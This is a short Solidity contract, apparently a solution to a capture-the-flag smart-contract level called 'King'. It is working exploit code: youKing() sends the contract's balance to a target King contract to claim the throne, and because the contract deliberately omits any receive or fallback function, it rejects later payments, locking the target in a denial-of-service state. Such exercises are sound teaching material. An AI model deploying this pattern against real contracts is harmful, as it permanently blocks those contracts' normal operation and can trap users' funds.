// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './King.sol';

// error NotAllowed();

contract KingAttack {

    address payable public kingMaker;

    constructor(address payable trg) payable {
        kingMaker = trg;  
    }

    function youKing() public {
        // kingMaker.transfer(msg.value);

        (bool success, ) = kingMaker.call{value: address(this).balance}("");
        require(success, "Ether transfer failed");
        require(King(kingMaker)._king() == address(this), "King not set");
    }

    //Not defining fallback and receive will also reject any transfer attempts
    // receive() external payable {
    //     revert NotAllowed();     
    // }    
}
